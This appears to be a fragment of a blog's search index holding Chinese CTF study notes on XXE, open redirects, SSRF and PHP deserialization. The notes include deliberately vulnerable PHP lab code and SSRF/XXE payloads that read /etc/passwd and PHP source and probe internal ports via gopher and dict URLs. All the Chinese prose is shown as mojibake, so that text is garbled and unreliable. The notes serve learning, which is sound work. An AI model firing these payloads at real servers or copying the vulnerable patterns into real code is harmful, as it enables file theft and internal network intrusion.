class="language-xml">å†…éƒ¨ç”³æ˜DTDæ ¼å¼<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">æ ¹å…ƒç´ </span> <span class="token punctuation">[</span><span class="token internal-subset">å…ƒç´ ç”³æ˜</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>å¤–éƒ¨å¼•ç”¨DTDæ ¼å¼<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">æ ¹å…ƒç´ </span> <span class="token name">SYSTEM</span> <span class="token string">"å¤–éƒ¨DTDçš„URI"</span><span class="token punctuation">&gt;</span></span>å¼•ç”¨å…¬å…±DTDæ ¼å¼<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">æ ¹å…ƒç´ </span> <span class="token name">PUBLIC</span> <span class="token string">"DTDæ ‡è¯†å"</span> <span class="token string">"å…¬å…±DTDçš„URI"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å†…éƒ¨å®ä½“å¼•ç”¨</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">hacker</span> <span class="token attr-name">"Hello!"</span><span class="token punctuation">&gt;</span></span></span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214213853922.png"></p><p><strong>å¤–éƒ¨å®ä½“å¼•ç”¨</strong></p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span><span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY f SYSTEM "file://æ–‡ä»¶è·¯å¾„"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token comment">//è€ƒè™‘åˆ°ç›®å‰å¾ˆå¤šç‰ˆæœ¬é‡Œé¢libxmlçš„ç‰ˆæœ¬éƒ½&gt;=2.9.0äº†,æ‰€ä»¥è¿™é‡Œæ·»åŠ äº†LIBXML_NOENTå‚æ•°å¼€å¯äº†å¤–éƒ¨å®ä½“è§£æ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$xml</span> <span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//    $xml = $test;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> @<span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'SimpleXMLElement'</span><span class="token punctuation">,</span><span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;pre&gt;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$data</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p&gt;XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ã€æ–‡æ¡£å…ƒç´ è¿™äº›éƒ½ææ‡‚äº†å—?&lt;/p&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="URLé‡å®šå‘"><a href="#URLé‡å®šå‘" class="headerlink" title="URLé‡å®šå‘"></a>URLé‡å®šå‘</h2><blockquote><p>ä¸å®‰å…¨çš„URLè·³è½¬é—®é¢˜å¯èƒ½å‘ç”Ÿåœ¨ä¸€åˆ‡æ‰§è¡Œäº†URLåœ°å€è·³è½¬çš„åœ°æ–¹ã€‚<br>å¦‚æœåç«¯é‡‡ç”¨äº†å‰ç«¯ä¼ è¿›æ¥çš„å‚æ•°(å¯èƒ½æ˜¯ç”¨æˆ·ä¼ å‚,æˆ–è€…ä¹‹å‰é¢„åŸ‹åœ¨å‰ç«¯é¡µé¢çš„URLåœ°å€)ä½œä¸ºäº†è·³è½¬çš„ç›®çš„åœ°,è€Œåˆæ²¡æœ‰åšåˆ¤æ–­çš„è¯å°±å¯èƒ½å‘ç”Ÿâ€è·³é”™å¯¹è±¡â€çš„é—®é¢˜ã€‚</p><p>URLè·³è½¬æ¯”è¾ƒç›´æ¥çš„å±å®³æ˜¯:â€“&gt;é’“é±¼,æ—¢æ”»å‡»è€…ä½¿ç”¨æ¼æ´æ–¹çš„åŸŸå(æ¯”å¦‚ä¸€ä¸ªæ¯”è¾ƒå‡ºåçš„å…¬å¸åŸŸåå¾€å¾€ä¼šè®©ç”¨æˆ·æ”¾å¿ƒçš„ç‚¹å‡»)åšæ©ç›–,è€Œæœ€ç»ˆè·³è½¬çš„ç¡®å®é’“é±¼ç½‘ç«™</p></blockquote><p>ä¸€å…±å››ä¸ªè¶…é“¾æ¥</p><p>ç»†å¿ƒç‚¹å‘ç°æœ€åä¸€ä¸ªURLå¸¦å‚æ•°</p><p>æŠŠiæ”¹æˆå…¶ä»–ç½‘å€è¯±å¯¼åˆ«äººç‚¹è¿›å»ï¼Œä»è€Œè¾¾åˆ°é’“é±¼çš„ç›®çš„</p><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p&gt;å¥½çš„,å¸Œæœ›ä½ èƒ½åšæŒåšä½ è‡ªå·±!&lt;/p&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰"></a>SSRFï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</h2><blockquote><p>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )ï¼Œå…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½,ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶</p><p>å¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®</p><p>æ•°æ®æµ:æ”»å‡»è€…â€”â€“&gt;æœåŠ¡å™¨â€”-&gt;ç›®æ ‡åœ°å€</p><p>ç®€å•ç†è§£ï¼šæœåŠ¡å™¨æ¥å—äº†å®¢æˆ·ç«¯è¾“å…¥çš„URLï¼Œç„¶åæœåŠ¡å™¨ç«¯æ‹¿URLå»è¯·æ±‚å¹¶è¿”å›ç»™ä½ ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&gt;</span><span class="token constant">PHP</span>ä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´<span class="token argument-name">SSRF</span><span class="token punctuation">:</span><span class="token operator">&gt;</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token operator">&gt;</span>å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š<span class="token punctuation">(</span><span class="token string double-quoted-string">"æˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚"</span><span class="token punctuation">)</span>çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚<span class="token punctuation">,</span>åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h3><blockquote><p>PHPæ”¯æŒçš„ç”±Daniel Stenbergåˆ›å»ºçš„libcurlåº“å…è®¸ä½ ä¸å„ç§çš„æœåŠ¡å™¨ä½¿ç”¨å„ç§ç±»å‹çš„åè®®è¿›è¡Œè¿æ¥å’Œé€šè®¯ã€‚</p><p>libcurlç›®å‰æ”¯æŒhttpã€httpsã€ftpã€gopherã€telnetã€dictã€fileå’Œldapåè®®ã€‚libcurlåŒæ—¶ä¹Ÿæ”¯æŒHTTPSè®¤è¯ã€HTTP POSTã€HTTP PUTã€ FTP ä¸Šä¼ (è¿™ä¸ªä¹Ÿèƒ½é€šè¿‡PHPçš„FTPæ‰©å±•å®Œæˆ)ã€HTTP  åŸºäºè¡¨å•çš„ä¸Šä¼ ã€ä»£ç†ã€cookieså’Œç”¨æˆ·å+å¯†ç çš„è®¤è¯ã€‚</p><p>PHPä¸­ä½¿ç”¨cURLå®ç°Getå’ŒPostè¯·æ±‚çš„æ–¹æ³•</p><p>è¿™äº›å‡½æ•°åœ¨PHP 4.0.2ä¸­è¢«å¼•å…¥ã€‚</p></blockquote><p><a href="https://www.runoob.com/php/php-ref-curl.html">èœé¸Ÿæ•™ç¨‹curl</a></p><pre class="line-numbers language-none"><code class="language-none">//fileåè®®è¯»å– ?url=file:///D://jwt.txt //gopheråè®® //åŸºæœ¬åè®®æ ¼å¼ï¼šURL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ ?url=gopher://119.23.243.154:22 //dictåè®® ?url=dict://119.23.243.154:22 //http/httpsåè®® ?url=http://x.x.x.x/ ?url=https://x.x.x.x/ //æ¢æµ‹å†…ç½‘å…¶ä»–ä¸»æœºçš„ç«¯å£ ?url=http://x.x.x.x:port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŠŠurlæ”¹æˆbaidu</p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214215750855.png"></p><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//payload:</span><span class="token comment">//file:///etc/passwd  è¯»å–æ–‡ä»¶</span><span class="token comment">//http://192.168.1.15:22 æ ¹æ®bannerè¿”å›,é”™è¯¯æç¤º,æ—¶é—´å»¶è¿Ÿæ‰«æç«¯å£</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//æ¥æ”¶å‰ç«¯URLæ²¡é—®é¢˜,ä½†æ˜¯è¦åšå¥½è¿‡æ»¤,å¦‚æœä¸åšè¿‡æ»¤,å°±ä¼šå¯¼è‡´SSRF</span>    <span class="token variable">$URL</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$CH</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$RES</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$CH</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment">//ssrfçš„é—®æ˜¯:å‰ç«¯ä¼ è¿›æ¥çš„urlè¢«åå°ä½¿ç”¨curl_exec()è¿›è¡Œäº†è¯·æ±‚,ç„¶åå°†è¯·æ±‚çš„ç»“æœåˆè¿”å›ç»™äº†å‰ç«¯ã€‚</span><span class="token comment">//é™¤äº†http/httpså¤–,curlè¿˜æ”¯æŒä¸€äº›å…¶ä»–çš„åè®®curl --version å¯ä»¥æŸ¥çœ‹å…¶æ”¯æŒçš„åè®®,telnet</span><span class="token comment">//curlæ”¯æŒå¾ˆå¤šåè®®ï¼Œæœ‰FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILEä»¥åŠLDAP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h3><p>file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚è¯¥å‡½æ•°æ˜¯ç”¨äºæŠŠæ–‡ä»¶çš„å†…å®¹è¯»å…¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„é¦–é€‰æ–¹æ³•ã€‚å¦‚æœæœåŠ¡å™¨æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè¿˜ä¼šä½¿ç”¨å†…å­˜æ˜ å°„æŠ€æœ¯æ¥å¢å¼ºæ€§èƒ½ã€‚</p><p>åŸºç¡€è¯­æ³•ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>include_path<span class="token punctuation">,</span>context<span class="token punctuation">,</span>start<span class="token punctuation">,</span>max_length<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>path</td><td>å¿…éœ€ã€‚è§„å®šè¦è¯»å–çš„æ–‡ä»¶ã€‚</td></tr><tr><td>include_path</td><td>å¯é€‰ã€‚å¦‚æœæ‚¨è¿˜æƒ³åœ¨ include_pathï¼ˆåœ¨ php.ini ä¸­ï¼‰ä¸­æœç´¢æ–‡ä»¶çš„è¯ï¼Œè¯·è®¾ç½®è¯¥å‚æ•°ä¸º â€˜1â€™ã€‚</td></tr><tr><td>context</td><td>å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚context æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ NULLï¼Œåˆ™å¿½ç•¥ã€‚</td></tr><tr><td>start</td><td>å¯é€‰ã€‚è§„å®šåœ¨æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½®ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚</td></tr><tr><td>max_length</td><td>å¯é€‰ã€‚è§„å®šè¯»å–çš„å­—èŠ‚æ•°ã€‚è¯¥å‚æ•°æ˜¯ PHP 5.1 ä¸­æ–°å¢çš„ã€‚</td></tr></tbody></table><p>æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//è¯»å–PHPæ–‡ä»¶çš„æºç :php://filter/read=convert.base64-encode/resource=ssrf.php</span><span class="token comment">//å†…ç½‘è¯·æ±‚:http://x.x.x.x/xx.index</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–å­¦ä¹ </title>
      <link href="2021/chang-jian-lou-dong/php-fan-xu-lie-hua/"/>
      <url>2021/chang-jian-lou-dong/php-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><p>é¦–å…ˆï¼Œä»phpçš„åºåˆ—åŒ–å…¥æ‰‹</p><p>PHP çš„æ‰€è°“çš„åºåˆ—åŒ–æ˜¯ä¸€ä¸ªå°†å„ç§ç±»å‹çš„æ•°æ®ï¼Œå‹ç¼©å¹¶æŒ‰ç…§ä¸€å®šæ ¼å¼å­˜å‚¨çš„è¿‡ç¨‹ï¼Œç”¨åˆ°çš„å‡½æ•°æ˜¯serialize()</p><p>ä¸»è¦æ˜¯ä»¥ä¸‹ä¸¤ä¸ªå‡½æ•°</p><pre class="line-numbers language-none"><code class="language-none">serialize()     //å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²unserialize()   //å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é€šè¿‡åºåˆ—åŒ–å’Œååºåˆ—åŒ–å¯ä»¥åœ¨phpä¸­æ–¹ä¾¿çš„ä¼ é€’å¯¹è±¡</p><p><strong>è®°ä½é‡è¦çš„ä¸€ç‚¹ï¼Œåºåˆ—åŒ–åªåºåˆ—åŒ–å±æ€§ï¼Œç±»é‡Œé¢çš„å±æ€§æ˜¯ä¸ä¼šè¢«åºåˆ—åŒ–çš„</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"kkk"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208201707028.png" alt="image-20210208201707028"></p><pre class="line-numbers language-none"><code class="language-none">ä¸€äº›å­—ç¬¦ç¼©å†™a - array                  b - boolean  d - double                 i - integero - common object          r - references - string                 C - custom objectO - class                  N - nullR - pointer reference      U - unicode string<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæœ‰ä¸ªå°ç»†èŠ‚ï¼Œå¯ä»¥çœ‹åˆ°flagé‚£ä¸ªå±æ€§åŸæ¥æ˜¯4ä¸ªå­—ç¬¦çš„ï¼Œåºåˆ—åŒ–ä¹‹åè¿˜æ˜¯4ä¸ªå­—ç¬¦ï¼›ä½†Testnameæ˜æ˜æ˜¯8ä¸ªå­—ç¬¦ï¼Œä½†å´æ˜¾ç¤º10ä¸ªå­—ç¬¦é€šè¿‡æŸ¥èµ„æ–™åå‘ç°å’Œè‡ªå·±å®šä¹‰çš„ç±»çš„å±æ€§æœ‰å…³ã€‚</p><p>é»˜è®¤çš„Publicå±æ€§ï¼Œåºåˆ—åŒ–ä¹‹åè¿˜æ˜¯ä¸å˜çš„ï¼Œé•¿åº¦æ˜¯å¤šå°‘å°±æ˜¯å¤šå°‘</p><p>ä½†Privateå±æ€§åºåˆ—åŒ–åçš„æ ¼å¼æ˜¯ï¼š<code>%00ç±»å%00å±æ€§å</code> ä¹Ÿå°±æ˜¯è¯´ç§æœ‰å±æ€§åºåˆ—åŒ–çš„ç»“æœæ˜¯åœ¨ç±»åå’Œå±æ€§åçš„å‰é¢åŠ ä¸ªç©ºç™½ç¬¦ç»™ä»–ä»¬åˆ†éš”å¼€</p><p>è€ŒProtectå±æ€§çš„æ ¼å¼åˆ™æ˜¯ï¼š<code>%00*%00å±æ€§å</code>  è¿™æ ·åšæˆ–è®¸æ˜¯ä¸ºäº†æ›´å¥½çš„åŒºåˆ†ä¸åŒçš„å±æ€§ç±»å‹å§ï¼Œå…·ä½“ä½œç”¨è¿˜ä¸æ˜¯å¾ˆæ¸…æ¥š</p><p>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ç±»ä¼¼ä¸å‹ç¼©å’Œè§£å‹çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å°±æ˜¯æŠŠåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„çŠ¶æ€çš„è¿‡ç¨‹</p><p>éšä¾¿æ‹¿ä¸€ä¸²åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ¥ååºåˆ—åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/imgimage-20210208211045455.png" alt="image-20210208211045455"></p><h3 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h3><p>åœ¨åˆ©ç”¨å¯¹PHPååºåˆ—åŒ–è¿›è¡Œåˆ©ç”¨æ—¶ï¼Œç»å¸¸éœ€è¦é€šè¿‡ååºåˆ—åŒ–ä¸­çš„é­”æœ¯æ–¹æ³•ï¼Œæ£€æŸ¥æ–¹æ³•é‡Œæœ‰æ— æ•æ„Ÿæ“ä½œæ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„æ–¹æ³•</p><pre class="line-numbers language-none"><code class="language-none">__construct()//åˆ›å»ºå¯¹è±¡æ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() 